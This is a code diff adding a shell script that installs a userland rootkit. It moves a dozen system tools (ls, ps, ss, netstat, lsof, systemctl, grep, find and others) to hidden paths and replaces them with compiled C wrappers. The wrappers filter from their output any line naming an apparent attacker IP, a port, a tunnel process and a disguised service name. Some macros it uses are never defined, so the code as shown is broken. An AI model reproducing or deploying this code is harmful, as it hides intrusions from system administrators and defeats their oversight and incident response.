@@ -1,0 +1,289 @@
+for i in 'cat'
+do
+	unalias $i
+	rm -f ./*.c
+	rm -f ./$i
+
+	a="`which $i`"wvikdlas
+	j="${a/$i/wvikdlas$i}"
+	key1="systemd-apt-power"
+	key2='43.228.91.117'
+	key3='-unix'
+	key4='ssh'
+	key5='wvikdlas'
+	key6='out_fifo'
+	key7='10899'
+	key8='tcptunnel'
+	key9='10.84.2.16'
+	cat << EOF > $i.c
+    #define BUFFER_LEN 0x400
+    #define BIN "$j"
+    #define INFO1 "$key1"
+    #define INFO2 "$key2"
+    #define INFO3 "$key3"
+    #define INFO4 "$key4"
+    #define INFO5 "$key5"
+    #define INFO6 "$key6"
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <unistd.h>
+    #include <fcntl.h>
+    #include <sys/stat.h>
+    #include <sys/types.h>
+    #include <sys/wait.h>
+    #include <string.h>
+	int info_inline(const char* info, char* buf)
+	{
+		int i = 0;
+		while (i < strlen(buf))
+	    {
+			while (info[0] != buf[i]) i++;
+			for (int j = 0; j < strlen(info); j++)
+	        {
+				if (info[j] != buf[i + j]) break;
+				if (j == strlen(info) - 1) return 1;
+			}
+			i++;
+		}
+		return 0;
+	}
+
+	void patch_space(char* buf)
+	{
+		int index = strlen(buf) - 1;
+		while (buf[index] != 32) index--;
+		while (buf[index] == 32) index--;
+		buf[index + 1] = 10;
+		buf[index + 2] = 0;
+	}
+
+	int main(int argc, char* argv[])
+	{
+		char out_buf[BUFFER_LEN];
+		int s = 2, c = 2;
+		char pipe[0x20] = "/dev/shm/out_fifo";
+		char pidstr[0x10];
+		int pid = getpid();
+		sprintf(pidstr, "%d", pid);
+		strcat(pipe, pidstr);
+		unlink(pipe);
+		mkfifo(pipe, 0777);
+		if (fork() == 0) 
+	    {
+			int fd = open(pipe, O_WRONLY);
+			dup2(fd, 1);
+			execv(BIN, argv);
+		} 
+	    else
+	    {
+			char ch;
+			int i = 0, flag = 0;
+			int fd = open(pipe, O_RDONLY);
+			while (read(fd, &ch, 1)) 
+	        {
+				out_buf[i] = ch;
+				if (ch == 10)
+	            {
+					if (argc == 1 && info_inline("ls", argv[0]) && !info_inline("of", argv[0]))
+	                {
+	                    out_buf[i++] = 32; //space ascii
+	                    out_buf[i] = 32;
+					}
+					out_buf[i + 1] = 0;     //str end
+	                do
+	                {
+	                    if (info_inline(INFO1, out_buf)) break;
+	                    if (info_inline(INFO2, out_buf)) break;
+	                    if (info_inline(INFO3, out_buf)) break;
+	                    if (info_inline(INFO4, out_buf)) break;
+	                    if (info_inline(INFO5, out_buf)) break;
+	                    if (info_inline(INFO6, out_buf)) break;
+	                    if (info_inline(INFO7, out_buf)) break;
+	                    if (info_inline(INFO8, out_buf)) break;
+	                    if (info_inline(INFO9, out_buf)) break;
+	                    //add info here
+
+	                    if (info_inline("/ss", argv[0]) || info_inline("/systemctl", argv[0]))
+	                        patch_space(out_buf);
+						printf("%s", out_buf);
+					} while (0);
+					i = -1;
+				}
+				i++;
+			}
+	        if (argc == 1 && info_inline("/ls", argv[0]))
+				putchar(10);
+
+			wait(&s);
+			while (!WIFEXITED(s));
+			c = WEXITSTATUS(s);
+		}
+		unlink(pipe);
+		return c;
+	}
+EOF
+	gcc -std=c99 $i.c -o ./$i
+	z="`which cp`"
+	b="`which $i`"
+	$z $b $j
+	$z './'$i $b
+	#echo ''
+done
+
+
+
+for i in 'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 'systemctl' 'last' 'grep' 'find' 'service'
+#for i in 'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 'grep' 'last'
+#for i in 'grep' 'systemctl'
+#'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 
+#for i in 'find'
+#for i in 'ls' 
+#for i in 'systemctl' 
+do
+	unalias $i
+	rm -f ./*.c
+	rm -f ./$i
+	a="`which $i`"wvikdlas
+	j="${a/$i/wvikdlas$i}"
+	key1="systemd-apt-power"
+	key2='43.228.91.117'
+	key3='-unix'
+	key4='ssh'
+	key5='wvikdlas'
+	key6='out_fifo'
+	key7='10899'
+	key8='tcptunnel'
+	key9='10.84.2.16'
+	/bin/wvikdlascatwvikdlas << EOF > $i.c
+    #define BUFFER_LEN 0x400
+    #define BIN "$j"
+    #define INFO1 "$key1"
+    #define INFO2 "$key2"
+    #define INFO3 "$key3"
+    #define INFO4 "$key4"
+    #define INFO5 "$key5"
+    #define INFO6 "$key6"
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <unistd.h>
+    #include <fcntl.h>
+    #include <sys/stat.h>
+    #include <sys/types.h>
+    #include <sys/wait.h>
+    #include <string.h>
+	int info_inline(const char* info, char* buf)
+	{
+		int i = 0;
+		while (i < strlen(buf))
+	    {
+			while (info[0] != buf[i]) i++;
+			for (int j = 0; j < strlen(info); j++)
+	        {
+				if (info[j] != buf[i + j]) break;
+				if (j == strlen(info) - 1) return 1;
+			}
+			i++;
+		}
+		return 0;
+	}
+
+	void patch_space(char* buf)
+	{
+		int index = strlen(buf) - 1;
+		while (buf[index] != 32) index--;
+		while (buf[index] == 32) index--;
+		buf[index + 1] = 10;
+		buf[index + 2] = 0;
+	}
+
+	int ls_without_args(int argc, char* argv[])
+	{
+		if (info_inline("ls", argv[0]) && !info_inline("of", argv[0]))
+        {
+        	if (argc == 1)
+        		return 1;
+            else if (argc == 2 && !strcmp("--color=auto", argv[1]))
+            	return 1;
+		}
+		return 0;
+	}
+
+	int main(int argc, char* argv[])
+	{
+		char out_buf[BUFFER_LEN];
+		int s = 2, c = 2;
+		char pipe[0x20] = "/dev/shm/out_fifo";
+		char pidstr[0x10];
+		int pid = getpid();
+		sprintf(pidstr, "%d", pid);
+		strcat(pipe, pidstr);
+		unlink(pipe);
+		mkfifo(pipe, 0777);
+		if (fork() == 0) 
+	    {
+			int fd = open(pipe, O_WRONLY);
+			dup2(fd, 1);
+			execv(BIN, argv);
+		} 
+	    else
+	    {
+			char ch;
+			int i = 0, flag = 0;
+			int fd = open(pipe, O_RDONLY);
+			while (read(fd, &ch, 1)) 
+	        {
+				out_buf[i] = ch;
+				if (ch == 10)
+	            {
+					if (ls_without_args(argc, argv) && isatty(1))
+	                {
+                    	out_buf[i++] = (char)32; //space ascii
+                    	out_buf[i] = (char)32;
+					}
+					out_buf[i + 1] = 0;     //str end
+	                do
+	                {
+	                    if (info_inline(INFO1, out_buf)) break;
+	                    if (info_inline(INFO2, out_buf)) break;
+	                    if (info_inline(INFO3, out_buf)) break;
+	                    if (info_inline(INFO4, out_buf)) break;
+	                    if (info_inline(INFO5, out_buf)) break;
+	                    if (info_inline(INFO6, out_buf)) break;
+	                    if (info_inline(INFO7, out_buf)) break;
+	                    if (info_inline(INFO8, out_buf)) break;
+	                    if (info_inline(INFO9, out_buf)) break;
+	                    //add info here
+
+	                    if (info_inline("ss", argv[0]) || info_inline("systemctl", argv[0]))
+	                    {
+	                    	//printf(argv[0]);
+	                        patch_space(out_buf);
+	                    }
+						printf("%s", out_buf);
+					} while (0);
+					i = -1;
+				}
+				i++;
+			}
+	        if (ls_without_args(argc, argv))
+	        {
+				printf("\n");
+	        }
+
+			wait(&s);
+			while (!WIFEXITED(s));
+			c = WEXITSTATUS(s);
+		}
+		unlink(pipe);
+		return c;
+	}
+EOF
+	gcc -std=c99 $i.c -o ./$i
+	z="`which cp`"
+	b="`which $i`"
+	$z $b $j
+	$z './'$i $b
+	#echo ''
+done
+
+
